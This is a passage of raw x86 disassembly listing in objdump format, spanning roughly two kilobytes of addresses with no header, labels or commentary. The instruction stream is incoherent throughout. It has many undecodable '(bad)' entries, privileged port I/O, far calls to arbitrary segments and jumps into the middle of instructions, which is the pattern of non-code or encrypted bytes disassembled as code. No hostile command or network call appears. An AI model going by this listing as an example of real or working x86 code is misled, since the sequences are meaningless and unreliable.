  4127f2:	add    DWORD PTR [edi],ebx
  4127f4:	push   edx
  4127f5:	jne    0x412783
  4127f7:	add    edx,DWORD PTR [esi+0x7618f744]
  4127fd:	pop    ecx
  4127fe:	pop    ebp
  4127ff:	imul   esi,DWORD PTR [edx+0x3c],0x22
  412803:	mov    dl,0xd7
  412805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412806:	adc    bl,BYTE PTR [eax+0x7b34586f]
  41280c:	sbb    dh,0x95
  41280f:	mov    ebx,0x4494cc8
  412814:	shl    DWORD PTR [eax],0xc5
  412817:	add    DWORD PTR [edx-0x50],esp
  41281a:	dec    ebp
  41281b:	(bad)
  41281e:	(bad)  
  41281f:	or     ecx,esp
  412821:	or     eax,0xe2408775
  412826:	add    eax,DWORD PTR [ebx]
  412828:	and    eax,DWORD PTR [esi]
  41282a:	pushf  
  41282b:	dec    edx
  41282c:	adc    eax,edx
  41282e:	leave  
  41282f:	shl    dl,cl
  412831:	xor    BYTE PTR [eax-0x7a],bh
  412834:	ret    
  412835:	rcr    DWORD PTR [edx+0x71],0x8f
  412839:	pop    ebp
  41283a:	daa    
  41283b:	push   ebx
  41283c:	sar    BYTE PTR [eax-0x34],0x51
  412840:	fwait
  412841:	inc    ebp
  412842:	in     eax,0x8
  412844:	mov    al,ds:0x1a327237
  412849:	aad    0x1f
  41284b:	cwde   
  41284c:	clc    
  41284d:	popa   
  41284e:	jge    0x41281d
  412850:	dec    eax
  412851:	xchg   ebx,eax
  412852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412853:	push   ecx
  412854:	pop    esi
  412855:	push   ebx
  412856:	push   ds
  412857:	and    dh,0x2b
  41285a:	xor    DWORD PTR ds:0x4e11e396,ebp
  412860:	dec    esi
  412861:	sub    al,BYTE PTR [ebx]
  412863:	push   ebp
  412864:	aam    0x26
  412866:	in     eax,dx
  412867:	sbb    al,BYTE PTR [eax]
  412869:	push   edi
  41286a:	fmulp  st(4),st
  41286c:	mov    eax,0x33238418
  412871:	jmp    0x7b160111
  412876:	fs out 0xc2,eax
  412879:	jmp    FWORD PTR [esi]
  41287b:	into   
  41287c:	int    0x3c
  41287e:	sub    eax,0xf0a0a564
  412883:	dec    esp
  412884:	mul    DWORD PTR [edi]
  412886:	push   esp
  412887:	dec    edx
  412888:	cmp    al,0x5f
  41288a:	mov    ah,0xb5
  41288c:	retf   
  41288d:	mov    ch,0x66
  41288f:	(bad)  
  412890:	loopne 0x41285a
  412892:	push   ds
  412893:	pop    ds
  412894:	sub    al,0x98
  412896:	add    al,cl
  412898:	mov    bh,bl
  41289a:	sub    BYTE PTR [ebx*2+0x237cc65b],dh
  4128a1:	shl    DWORD PTR [ebx],0x19
  4128a4:	(bad)  [eax]
  4128a6:	rol    DWORD PTR ds:0x2243f111,1
  4128ac:	xor    BYTE PTR [ebx-0x7fa7d0f5],dh
  4128b2:	pop    ebp
  4128b3:	fiadd  WORD PTR [ebx-0x4252a8b0]
  4128b9:	push   0xffffff81
  4128bb:	push   edi
  4128bc:	sub    eax,0xd119257b
  4128c1:	pop    ebp
  4128c2:	ds inc ebx
  4128c4:	es xor eax,0xf1ca4a49
  4128ca:	in     eax,0x42
  4128cc:	cmp    BYTE PTR [edx+0x0],cl
  4128cf:	cmp    al,0x5
  4128d1:	and    BYTE PTR [edi],0x7f
  4128d4:	frstor ds:0x4b063fbe
  4128da:	xor    eax,0xf4f2e2f3
  4128df:	push   ds
  4128e0:	add    BYTE PTR [ebp+ebx*8+0x6faad041],ch
  4128e7:	or     ebp,esp
  4128e9:	dec    eax
  4128ea:	iret   
  4128eb:	xor    BYTE PTR [ecx-0x5f],dh
  4128ee:	xchg   esi,eax
  4128ef:	or     eax,0xa324d1eb
  4128f4:	hlt    
  4128f5:	jo     0x412908
  4128f7:	psubw  mm3,QWORD PTR [ecx-0x54]
  4128fb:	loopne 0x41291d
  4128fd:	mov    ecx,0xc15aa51d
  412902:	dec    ebp
  412903:	fs mov dh,0x18
  412906:	add    DWORD PTR [esp+edx*8-0xb],edi
  41290a:	cmc    
  41290b:	add    cl,BYTE PTR [edi-0x32]
  41290e:	push   ss
  41290f:	in     al,0x10
  412911:	aaa    
  412912:	lods   eax,DWORD PTR ds:[esi]
  412913:	pop    ds
  412914:	mov    al,0x4e
  412916:	push   ebp
  412917:	cmp    dh,dl
  412919:	out    dx,al
  41291a:	hlt    
  41291b:	lock enter 0xa767,0x2f
  412920:	clc    
  412921:	inc    eax
  412922:	mov    BYTE PTR [esi-0x2bccc900],0x39
  412929:	mov    ds,WORD PTR [edx-0x35]
  41292c:	sub    BYTE PTR [ebp+0x120f8d33],0xcc
  412933:	sub    al,0xca
  412935:	jle    0x412934
  412937:	fadd   st(0),st
  412939:	push   edi
  41293a:	push   es
  41293b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41293c:	mov    ecx,0x7537c323
  412941:	mov    bl,0x7d
  412943:	int3   
  412944:	arpl   WORD PTR [ecx+0x3b],di
  412947:	push   ebp
  412948:	mov    dh,0x61
  41294a:	(bad)  
  41294b:	in     eax,dx
  41294c:	adc    eax,0x8177797
  412951:	mov    bh,0xc5
  412954:	mov    edi,0x1bff92f
  412959:	mov    eax,0xe74ac05c
  41295e:	sub    eax,0xd9bb2eb5
  412963:	in     eax,0x73
  412965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412966:	add    al,0xc9
  412968:	stc    
  412969:	push   esi
  41296a:	not    eax
  41296c:	pop    ds
  41296d:	cmc    
  41296e:	fiadd  WORD PTR [esi]
  412970:	jmp    DWORD PTR [edx]
  412972:	test   al,0x7f
  412974:	icebp  
  412975:	popf   
  412976:	lods   al,BYTE PTR ds:[esi]
  412977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412978:	cmp    al,0xda
  41297a:	sbb    eax,0x4473a8a4
  41297f:	bound  esi,QWORD PTR [ebp+0x2de2eb39]
  412985:	adc    DWORD PTR [eax-0x2a754277],eax
  41298b:	and    eax,0x5684be3
  412990:	and    eax,0x87b3b58f
  412995:	xor    ch,0x5
  412998:	fnsave [edx]
  41299a:	in     al,0xf9
  41299c:	or     cl,BYTE PTR [edx-0x6a]
  41299f:	int3   
  4129a0:	out    0x19,al
  4129a2:	xchg   ebx,eax
  4129a3:	jmp    0x41296a
  4129a5:	imul   esi,DWORD PTR [ecx+0x661ded01],0xd0fc11df
  4129af:	pop    ds
  4129b0:	cmp    al,0x2b
  4129b2:	dec    esp
  4129b3:	mov    esi,0x88f8047a
  4129b8:	pusha  
  4129b9:	sti    
  4129ba:	push   ebp
  4129bb:	pop    ecx
  4129bc:	(bad)  
  4129bd:	fsubr  QWORD PTR [edx-0x26]
  4129c0:	xchg   ecx,eax
  4129c1:	cld    
  4129c2:	(bad)  
  4129c3:	sbb    eax,0x6209c8cf
  4129c8:	cli    
  4129c9:	and    ebp,DWORD PTR [esi+eax*2-0x41]
  4129cd:	aad    0xda
  4129cf:	xchg   ebp,eax
  4129d0:	push   cs
  4129d1:	push   edi
  4129d2:	(bad)  [esi+esi*2-0x3bd11395]
  4129d9:	xor    dl,BYTE PTR ds:0xa4265db
  4129df:	jo     0x4129e4
  4129e1:	and    eax,0x2ddb80f5
  4129e6:	jbe    0x4129a2
  4129e8:	popf   
  4129e9:	xchg   edi,eax
  4129ea:	xchg   ebp,eax
  4129eb:	inc    edi
  4129ec:	pop    ebp
  4129ed:	les    edi,FWORD PTR [edi-0x5ee10114]
  4129f3:	mov    ebx,cs
  4129f5:	xlat   BYTE PTR ds:[ebx]
  4129f6:	jns    0x4129c0
  4129f8:	ret    0x30b7
  4129fb:	adc    BYTE PTR [edi-0x59],0xe6
  4129ff:	xchg   DWORD PTR [ecx+0x3f],edi
  412a02:	and    esi,ecx
  412a04:	push   esi
  412a05:	and    BYTE PTR [ebp+0x31],bl
  412a08:	dec    ebp
  412a09:	test   eax,0xbe610909
  412a0e:	aam    0xda
  412a10:	cmp    BYTE PTR [ecx-0x5e8fbf8],0x49
  412a17:	aam    0xd1
  412a19:	mov    WORD PTR [edx],?
  412a1b:	xor    al,0xd
  412a1d:	ss jecxz 0x412a43
  412a20:	sbb    BYTE PTR [esp+ebx*4],ch
  412a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a24:	ret    0xe59
  412a27:	data16 adc bh,BYTE PTR [eax+0x44]
  412a2b:	jle    0x412a00
  412a2d:	out    0x2,al
  412a2f:	iret   
  412a30:	jmp    0x412aa4
  412a32:	add    eax,0x621c3352
  412a37:	aam    0x4d
  412a39:	not    cl
  412a3b:	(bad)  
  412a3c:	mov    ch,0x61
  412a3e:	mov    al,ds:0x64fee15e
  412a43:	add    BYTE PTR [ebp-0x2d],dh
  412a46:	xor    DWORD PTR [eax-0x29],eax
  412a49:	addr16 hlt 
  412a4b:	jmp    FWORD PTR [ebx-0x2b]
  412a4e:	arpl   bx,cx
  412a50:	adc    al,0x9b
  412a52:	leave  
  412a53:	cmp    BYTE PTR [edi],bl
  412a55:	inc    ebp
  412a56:	js     0x412a55
  412a58:	mov    dh,0x35
  412a5a:	(bad)  
  412a5c:	test   BYTE PTR [ebp+0x24907335],ah
  412a62:	pop    ss
  412a63:	pop    edi
  412a64:	cmp    eax,0xef692432
  412a69:	aad    0xc8
  412a6b:	xor    DWORD PTR [edi-0x32],esp
  412a6e:	mov    ds:0xc360f017,eax
  412a73:	mov    al,BYTE PTR [edx+0x59]
  412a76:	adc    edi,DWORD PTR [ebx+0x2d]
  412a79:	dec    eax
  412a7a:	jp     0x412a0f
  412a7c:	pop    ds
  412a7d:	and    BYTE PTR [eax-0x43],dl
  412a80:	inc    ebx
  412a81:	stos   BYTE PTR es:[edi],al
  412a82:	iret   
  412a83:	in     al,dx
  412a84:	outs   dx,DWORD PTR ds:[esi]
  412a85:	sub    eax,0x284267e9
  412a8a:	xchg   ebx,ebp
  412a8c:	scas   al,BYTE PTR es:[edi]
  412a8d:	mov    bl,0x5f
  412a8f:	inc    ebp
  412a90:	xchg   esp,eax
  412a91:	push   0x7
  412a93:	push   ecx
  412a94:	loop   0x412a41
  412a96:	add    esp,DWORD PTR [ecx+0x1fadf7b9]
  412a9c:	inc    edi
  412a9d:	cs ss xchg ecx,eax
  412aa0:	dec    ebp
  412aa1:	arpl   WORD PTR [edx+0xe],cx
  412aa4:	push   eax
  412aa5:	test   eax,0x2d8500f
  412aaa:	sahf   
  412aab:	inc    edi
  412aac:	adc    al,0xf7
  412aae:	cmp    bl,bl
  412ab0:	test   al,0xd4
  412ab2:	sbb    eax,0xa900a641
  412ab7:	lds    esi,FWORD PTR fs:[eax-0x37]
  412abb:	jl     0x412ac4
  412abd:	add    edi,DWORD PTR [eax+0x7f]
  412ac0:	cmp    ebx,DWORD PTR [eax-0x14]
  412ac3:	jmp    0x412b3e
  412ac5:	rcl    BYTE PTR [ebx+eax*1],1
  412ac8:	daa    
  412ac9:	pop    esi
  412aca:	std    
  412acb:	sbb    eax,DWORD PTR [esi+0x35]
  412ace:	and    BYTE PTR [edi-0x1],al
  412ad1:	lea    eax,[eax-0x53]
  412ad4:	jp     0x412adf
  412ad6:	idiv   DWORD PTR [edi+0x28efd52]
  412adc:	loop   0x412ae1
  412ade:	cmp    ebx,eax
  412ae0:	fisubr WORD PTR [ebx-0x5]
  412ae3:	jl     0x412b08
  412ae5:	adc    eax,0x9f1eb9a5
  412aea:	pop    ss
  412aeb:	xchg   DWORD PTR [ebx],esi
  412aed:	loope  0x412b69
  412aef:	inc    eax
  412af0:	xchg   edx,eax
  412af1:	or     ah,0xd9
  412af4:	cmp    DWORD PTR [edi-0x1f],0xfffffff3
  412af8:	and    DWORD PTR [ebx+0x30],edx
  412afb:	loope  0x412aaf
  412afd:	mov    BYTE PTR [edx],cl
  412aff:	icebp  
  412b00:	jnp    0x412b48
  412b02:	in     al,0xf0
  412b04:	xor    esi,eax
  412b06:	pop    edx
  412b07:	mov    ebp,0x1506cbb4
  412b0c:	dec    eax
  412b0d:	addr16 dec ebx
  412b0f:	popa   
  412b10:	arpl   bp,si
  412b12:	mov    esp,0x21a3d190
  412b17:	pop    es
  412b18:	cmc    
  412b19:	cmc    
  412b1a:	(bad)
  412b1d:	pop    esp
  412b1e:	sbb    edi,DWORD PTR [eax]
  412b20:	jge    0x412b68
  412b22:	dec    edx
  412b23:	mov    bh,0x40
  412b25:	ret    0x9f78
  412b28:	data16 rol BYTE PTR [edi],cl
  412b2b:	or     eax,0x4f3b05b1
  412b30:	(bad)  
  412b31:	or     al,0xb4
  412b33:	cdq    
  412b34:	xor    cl,BYTE PTR [edi-0x1c13732a]
  412b3a:	int3   
  412b3b:	inc    ecx
  412b3c:	and    BYTE PTR [eax],dh
  412b3e:	push   ebx
  412b3f:	adc    bh,cl
  412b41:	(bad)  
  412b43:	(bad)  
  412b44:	cmp    DWORD PTR [edi+0x71d9bdbb],ecx
  412b4a:	jno    0x412b05
  412b4c:	addr16 push ss
  412b4e:	xor    ecx,DWORD PTR [edx+ebp*1-0x5a1075d4]
  412b55:	es pop esi
  412b57:	dec    ebx
  412b58:	push   edi
  412b59:	push   ds
  412b5a:	(bad)  [edx]
  412b5c:	dec    ecx
  412b5d:	(bad)  
  412b5e:	cld    
  412b5f:	push   0x1fed70b9
  412b64:	sub    dh,dl
  412b66:	mov    dh,0xd2
  412b68:	mul    DWORD PTR [ebp+ebx*1+0x14de3b0f]
  412b6f:	icebp  
  412b70:	push   ecx
  412b71:	push   edi
  412b72:	test   DWORD PTR [ecx],0x97dc875d
  412b78:	pop    ds
  412b79:	ja     0x412baf
  412b7b:	and    al,0xd2
  412b7d:	push   0xc9c5ad19
  412b82:	xor    ch,BYTE PTR [esi+0x38]
  412b85:	inc    eax
  412b86:	sub    WORD PTR [esi],si
  412b89:	add    dh,dh
  412b8b:	ficom  WORD PTR [edi-0x12]
  412b8e:	imul   ecx,DWORD PTR [ecx+0x63cb51c],0xfffffff2
  412b95:	sahf   
  412b96:	std    
  412b97:	sahf   
  412b98:	iret   
  412b99:	add    al,0xc7
  412b9b:	mov    eax,0x8703f36d
  412ba0:	mov    edi,0x9306a89f
  412ba5:	int    0x30
  412ba7:	cmc    
  412ba8:	gs mov esp,0x46c6d88f
  412bae:	hlt    
  412baf:	mov    ebx,DWORD PTR [ebx]
  412bb1:	or     edi,esi
  412bb3:	test   BYTE PTR [ecx],ah
  412bb5:	xrelease mov DWORD PTR [ebx-0x6235d527],esi
  412bbc:	pop    ds
  412bbd:	jae    0x412b48
  412bbf:	sub    al,0xf5
  412bc1:	gs pushf 
  412bc3:	dec    eax
  412bc4:	mov    al,bl
  412bc6:	xchg   ecx,eax
  412bc7:	adc    al,0xc8
  412bc9:	stc    
  412bca:	xchg   edi,eax
  412bcb:	call   0x7857:0xcdfacbf3
  412bd2:	and    BYTE PTR [edx+0x61234789],dl
  412bd8:	cmp    DWORD PTR [eax],eax
  412bda:	popf   
  412bdb:	dec    edi
  412bdc:	fwait
  412bdd:	outs   dx,BYTE PTR ds:[esi]
  412bde:	or     eax,0x808229a5
  412be3:	sbb    ebx,DWORD PTR [ebx+0x57]
  412be6:	cmp    cl,BYTE PTR [esi]
  412be8:	jnp    0x412bfd
  412bea:	imul   esp,DWORD PTR [ebx+ecx*2-0x47],0x86d6b24d
  412bf2:	outs   dx,BYTE PTR ds:[esi]
  412bf3:	cwde   
  412bf4:	xchg   DWORD PTR [esi+esi*4-0x74],edi
  412bf8:	sbb    esi,DWORD PTR [edi-0x56]
  412bfb:	addr16 push ecx
  412bfd:	shl    BYTE PTR [esi+0x419fed5b],0x91
  412c04:	xchg   ebp,eax
  412c05:	jmp    FWORD PTR [esi]
  412c07:	mov    ch,0xdb
  412c09:	jb     0x412ba3
  412c0b:	int3   
  412c0c:	rol    BYTE PTR [eax],cl
  412c0e:	stc    
  412c0f:	sub    dl,ah
  412c11:	jle    0x412b9f
  412c13:	pop    DWORD PTR [esi+0x42]
  412c16:	jb     0x412c7a
  412c18:	push   0x8
  412c1a:	fild   WORD PTR [ecx]
  412c1c:	jge    0x412c35
  412c1e:	cmp    eax,eax
  412c20:	bound  edi,QWORD PTR [ecx]
  412c22:	inc    ebp
  412c23:	(bad)  
  412c24:	ja     0x412c42
  412c26:	(bad)  
  412c27:	shl    BYTE PTR ds:0x14091b18,1
  412c2d:	xor    esp,0x49674991
  412c33:	mov    cl,0x16
  412c35:	ret    0x45a3
  412c38:	jle    0x412c10
  412c3a:	gs cmp dh,ch
  412c3d:	or     al,0x29
  412c3f:	jecxz  0x412c5d
  412c41:	inc    esi
  412c42:	ss popa 
  412c44:	arpl   WORD PTR [esi-0x39b3410c],sp
  412c4a:	sar    BYTE PTR [ebx+0x68],cl
  412c4d:	aas    
  412c4e:	test   ch,al
  412c50:	cmp    eax,0xbc42b4e6
  412c55:	dec    eax
  412c56:	fxch   st(7)
  412c58:	jae    0x412ca1
  412c5a:	lds    ebp,FWORD PTR es:[ebx]
  412c5d:	inc    ecx
  412c5e:	fild   DWORD PTR [ebx]
  412c60:	call   0xcac7:0x715e850e
  412c67:	cmp    DWORD PTR [ebp-0x3be638b5],esp
  412c6d:	mov    ecx,0x9c86bc45
  412c72:	push   es
  412c73:	dec    edx
  412c74:	add    BYTE PTR [edx+ebx*8-0x7d],dl
  412c78:	jne    0x412bfa
  412c7a:	int3   
  412c7b:	lock fs aas 
  412c7e:	jge    0x412c9f
  412c80:	xchg   esi,eax
  412c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c82:	ds inc eax
  412c84:	mov    ch,0x49
  412c86:	popa   
  412c87:	sti    
  412c88:	cmp    eax,0x623febc8
  412c8d:	push   0x65947cf2
  412c92:	and    eax,0x28227a7a
  412c97:	mov    cl,0xea
  412c99:	pop    ebx
  412c9a:	jp     0x412ccc
  412c9c:	xchg   esp,eax
  412c9d:	add    DWORD PTR [esi-0x1e],0xffffffce
  412ca1:	jno    0x412c49
  412ca3:	mov    al,ds:0x326b3564
  412ca8:	mov    al,ds:0x8d7613f1
  412cad:	in     al,0xc9
  412caf:	mov    bl,0x36
  412cb1:	lahf   
  412cb2:	in     al,dx
  412cb3:	pushf  
  412cb4:	loopne 0x412c62
  412cb6:	xor    al,0x67
  412cb8:	mov    al,BYTE PTR [esp+0x79c64d1c]
  412cbf:	int3   
  412cc0:	(bad)  
  412cc2:	mov    dl,0xdc
  412cc4:	jns    0x412cd8
  412cc6:	scas   eax,DWORD PTR es:[edi]
  412cc7:	hlt    
  412cc8:	add    edx,ebx
  412cca:	dec    eax
  412ccb:	scas   eax,DWORD PTR es:[edi]
  412ccc:	dec    eax
  412ccd:	(bad)  
  412cce:	jle    0x412cb0
  412cd0:	xchg   edi,eax
  412cd1:	inc    esi
  412cd2:	lea    ebp,[edi+0x74f086c]
  412cd8:	adc    eax,0xa2281946
  412cdd:	es mov edx,0xd17496cc
  412ce3:	stc    
  412ce4:	sar    DWORD PTR [ebx+esi*4-0x7aeb6097],1
  412ceb:	inc    ecx
  412cec:	fnstenv [edi-0x2e72ea1c]
  412cf2:	pusha  
  412cf3:	mov    esp,0x36b5ff21
  412cf8:	dec    ebx
  412cf9:	mov    al,ds:0xead1dd78
  412cfe:	xchg   ebx,eax
  412cff:	mov    DWORD PTR [edx-0x5e],esi
  412d02:	lods   eax,DWORD PTR ds:[esi]
  412d03:	mov    bl,0xe
  412d05:	sbb    BYTE PTR [ebx],0xe6
  412d08:	lahf   
  412d09:	inc    edi
  412d0a:	inc    edi
  412d0b:	xor    ecx,esp
  412d0d:	jo     0x412ca5
  412d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d10:	imul   edx,ebp,0x28
  412d13:	ins    BYTE PTR es:[edi],dx
  412d14:	cwde   
  412d15:	sub    DWORD PTR [eax-0x46],ecx
  412d18:	sub    ah,BYTE PTR [eax]
  412d1a:	mov    ds:0x7e7aafcf,eax
  412d1f:	ss mov edx,0xa774d4d4
  412d25:	add    al,0x31
  412d27:	ffreep st(5)
  412d29:	in     eax,dx
  412d2a:	daa    
  412d2b:	addr16 jns 0x412d03
  412d2e:	sub    eax,0x8db24e2a
  412d33:	push   cs
  412d34:	loopne 0x412cf6
  412d36:	shr    DWORD PTR [edi-0x66ffbe6f],cl
  412d3c:	icebp  
  412d3d:	outs   dx,BYTE PTR ds:[esi]
  412d3e:	inc    ebp
  412d3f:	fld1   
  412d41:	mov    ebx,0x6a6aef3e
  412d46:	adc    eax,0xe4665fff
  412d4b:	popf   
  412d4c:	fwait
  412d4d:	xor    ecx,ebp
  412d4f:	add    ch,ch
  412d51:	mov    ecx,esp
  412d53:	sar    BYTE PTR [ebx],1
  412d55:	out    dx,eax
  412d56:	loopne 0x412d50
  412d58:	sub    BYTE PTR [esi+eiz*4+0x11],bh
  412d5c:	lods   al,BYTE PTR ds:[esi]
  412d5d:	sti    
  412d5e:	out    0xd0,eax
  412d60:	js     0x412cf4
  412d62:	push   edx
  412d63:	mov    cl,0xcf
  412d65:	jl     0x412d58
  412d67:	cmp    eax,0x7f2a1813
  412d6c:	ret    
  412d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d6e:	pop    edi
  412d6f:	add    ch,dl
  412d71:	repnz inc ebx
  412d73:	shl    esi,1
  412d75:	cmp    al,0x6b
  412d77:	or     eax,0xe228b062
  412d7c:	cmp    eax,0x6af311bd
  412d81:	mov    cl,0x3d
  412d83:	pusha  
  412d84:	dec    edi
  412d85:	scas   eax,DWORD PTR es:[edi]
  412d86:	repnz es loopne 0x412dda
  412d8a:	fbld   TBYTE PTR [eax-0x7b]
  412d8d:	push   esi
  412d8e:	js     0x412dc2
  412d90:	jmp    0x6d83:0x6e2518f7
  412d97:	(bad)  
  412d98:	ficomp DWORD PTR [ebx+0x4a]
  412d9b:	and    eax,0x5658bfa8
  412da0:	pop    ebx
  412da1:	jmp    0x10d9:0x10974b7a
  412da8:	nop
  412da9:	fstp   DWORD PTR [edx]
  412dab:	stos   DWORD PTR es:[edi],eax
  412dac:	test   DWORD PTR [esi],0x70753fc9
  412db2:	leave  
  412db3:	sbb    DWORD PTR [eax],0x42
  412db6:	sub    bl,BYTE PTR [ebp+0x0]
  412db9:	dec    edi
  412dba:	or     cl,bl
  412dbc:	adc    ch,bl
  412dbe:	mov    esi,0x6d452698
  412dc3:	cmp    ch,0x4c
  412dc6:	jge    0x412dc8
  412dc8:	cmova  edx,DWORD PTR [ebx]
  412dcb:	inc    esi
  412dcc:	cmp    al,0x64
  412dce:	mov    eax,ds:0xd189f27d
  412dd3:	sub    eax,edx
  412dd5:	pop    edx
  412dd6:	ds pushf 
  412dd8:	jno    0x412e4d
  412dda:	and    BYTE PTR [edi-0x2],cl
  412ddd:	and    edx,ebx
  412ddf:	push   edi
  412de0:	jno    0x412dc5
  412de2:	push   ebp
  412de3:	scas   eax,DWORD PTR es:[edi]
  412de4:	fwait
  412de5:	push   eax
  412de6:	dec    esi
  412de7:	xchg   edx,eax
  412de8:	mov    eax,ds:0x6c21f51d
  412ded:	sub    eax,edx
  412def:	cli    
  412df0:	(bad)  
  412df1:	pop    esi
  412df2:	mov    ah,0x80
  412df4:	dec    esi
  412df5:	and    ah,bl
  412df7:	adc    BYTE PTR [ecx+0x75],0xa2
  412dfb:	cdq    
  412dfc:	fsubr  QWORD PTR [ebx+edi*4]
  412dff:	add    ch,ch
  412e01:	jecxz  0x412d8d
  412e03:	mov    ds:0x9216edd1,eax
  412e08:	(bad)  
  412e09:	aas    
  412e0a:	outs   dx,DWORD PTR ds:[esi]
  412e0b:	inc    ecx
  412e0c:	pop    ds
  412e0d:	cmp    al,0xfb
  412e0f:	push   esi
  412e10:	jnp    0x412e01
  412e12:	dec    ecx
  412e13:	xchg   ebp,eax
  412e14:	aam    0xdc
  412e16:	iret   
  412e17:	mov    ah,0x72
  412e19:	pop    esi
  412e1a:	inc    eax
  412e1b:	les    ecx,FWORD PTR [eax+0x6b]
  412e1e:	mov    esp,ebx
  412e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e21:	dec    edx
  412e22:	inc    edx
  412e23:	in     al,dx
  412e24:	loope  0x412e53
  412e26:	cmp    cl,BYTE PTR [esi+ebp*2-0x3b]
  412e2a:	xchg   esi,eax
  412e2b:	xchg   esi,eax
  412e2c:	dec    DWORD PTR [ebx+ebp*2+0x4ae42383]
  412e33:	jle    0x412dec
  412e35:	mov    BYTE PTR [ebp-0x6d0a0d2f],dh
  412e3b:	loop   0x412e3c
  412e3d:	cwde   
  412e3e:	or     bh,cl
  412e40:	add    bh,BYTE PTR [ecx-0x8f69d14]
  412e46:	ror    ebx,1
  412e48:	out    dx,eax
  412e49:	mov    BYTE PTR [edi-0x36],bh
  412e4c:	lahf   
  412e4d:	out    0xd5,al
  412e4f:	shr    bh,1
  412e51:	je     0x412ed1
  412e53:	xor    ebp,DWORD PTR [edx]
  412e55:	aad    0x98
  412e57:	mov    cl,0xa6
  412e59:	or     bl,al
  412e5b:	lock pop esp
  412e5d:	rol    ah,1
  412e5f:	push   es
  412e60:	and    bl,BYTE PTR [edi-0x4bdb78ad]
  412e66:	mov    al,dl
  412e68:	push   edi
  412e69:	jl     0x412e61
  412e6b:	pushf  
  412e6c:	loop   0x412e87
  412e6e:	push   ds
  412e6f:	sub    DWORD PTR [ecx+0x2],eax
  412e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e73:	cld    
  412e74:	mov    ebp,0xd7e0ad99
  412e79:	add    al,0x9c
  412e7b:	lods   al,BYTE PTR ds:[esi]
  412e7c:	call   0xb5f6:0x6eef29c7
  412e83:	mov    eax,ds:0x9604c563
  412e88:	dec    edx
  412e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e8a:	jo     0x412ec3
  412e8c:	fistp  WORD PTR [edi*8-0x757fadab]
  412e93:	push   es
  412e94:	(bad)  
  412e96:	mov    eax,0x34db4da1
  412e9b:	jb     0x412ebf
  412e9d:	push   ss
  412e9e:	pop    ebp
  412e9f:	call   0xa88d:0x35a59d3c
  412ea6:	dec    esp
  412ea7:	iret   
  412ea8:	xchg   BYTE PTR [ecx-0x3d4ce332],cl
  412eae:	mov    dl,0x11
  412eb0:	test   al,0xb0
  412eb2:	repz or al,0xd9
  412eb5:	retf   0x9075
  412eb8:	mov    edx,0x664d20c0
  412ebd:	push   ebp
  412ebe:	push   cs
  412ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec0:	fmul   DWORD PTR [edi]
  412ec2:	jmp    0xe0ba5272
  412ec7:	push   esp
  412ec8:	call   0xd69f23d2
  412ecd:	mov    dh,0x53
  412ecf:	pop    ebp
  412ed0:	pushf  
  412ed1:	iret   
  412ed2:	fst    DWORD PTR [edx]
  412ed4:	test   esp,edx
  412ed6:	pop    esi
  412ed7:	into   
  412ed8:	pop    es
  412ed9:	frstor [ecx-0x261a7267]
  412edf:	pop    DWORD PTR [ebx+0x7cae0064]
  412ee5:	stc    
  412ee6:	cmc    
  412ee7:	loope  0x412e75
  412ee9:	sbb    eax,0x2ebbc565
  412eee:	cmc    
  412eef:	lods   al,BYTE PTR ds:[esi]
  412ef0:	mov    edi,0x4caae994
  412ef5:	xchg   edi,eax
  412ef6:	mov    esp,0x383677
  412efb:	or     cl,ch
  412efd:	enter  0xc3f7,0xac
  412f01:	xor    eax,0xe438e164
  412f06:	(bad)  
  412f07:	sub    esp,DWORD PTR [esi-0x3d]
  412f0a:	mov    ch,0xa
  412f0c:	jl     0x412eb3
  412f0e:	xor    al,0xaf
  412f10:	loope  0x412ec9
  412f12:	inc    edi
  412f13:	xchg   esi,eax
  412f14:	xchg   edx,eax
  412f15:	mov    DWORD PTR [eax],edx
  412f17:	add    DWORD PTR [ebx-0x69344822],esp
  412f1d:	sbb    ecx,ebp
  412f1f:	addps  xmm0,XMMWORD PTR [ecx+0x19]
  412f23:	adc    al,0xdc
  412f25:	sti    
  412f26:	adc    cl,al
  412f28:	and    al,ah
  412f2a:	push   ebp
  412f2b:	jne    0x412f96
  412f2d:	sub    eax,0xa1d5ec39
  412f32:	ficomp WORD PTR [esi+0x25c01a70]
  412f38:	in     eax,0x32
  412f3a:	rcl    BYTE PTR [esi-0x3f53b554],0x60
  412f41:	jg     0x412f68
  412f43:	inc    edi
  412f44:	ret    0x5218
  412f47:	sti    
  412f48:	inc    ecx
  412f49:	or     edi,DWORD PTR [edx]
  412f4b:	mov    edi,ss
  412f4d:	loope  0x412eeb
  412f4f:	add    ecx,eax
  412f51:	or     al,0x21
  412f53:	cmp    ebx,eax
  412f55:	xor    eax,0x8777adb5
  412f5a:	jo     0x412fca
  412f5c:	imul   ebx,DWORD PTR [edx+0x5900c58a],0x4f7d3cab
  412f66:	outs   dx,BYTE PTR ds:[esi]
  412f67:	scas   al,BYTE PTR es:[edi]
  412f68:	push   edi
  412f69:	adc    DWORD PTR [esi+0xe634fe4],ebx
  412f6f:	adc    eax,0x80cae49e
  412f74:	dec    esi
  412f75:	pop    edi
  412f76:	arpl   ax,sp
  412f78:	jae    0x412fc1
  412f7a:	sub    BYTE PTR [edx],ah
  412f7c:	lock ja 0x412f66
  412f7f:	cmp    al,0xce
  412f81:	(bad)  
  412f82:	(bad)  
  412f84:	xor    BYTE PTR ds:0xf719454f,al
  412f8a:	arpl   WORD PTR [ecx+eax*1-0x183b20ed],cx
  412f91:	add    BYTE PTR [edx-0x52],dh
  412f94:	xchg   edi,eax
  412f95:	stc    
  412f96:	pop    edx
  412f97:	fcom   QWORD PTR [edx-0x31]
  412f9a:	pop    esi
  412f9b:	shl    DWORD PTR [edi-0x71e1e3ce],1
  412fa1:	popf   
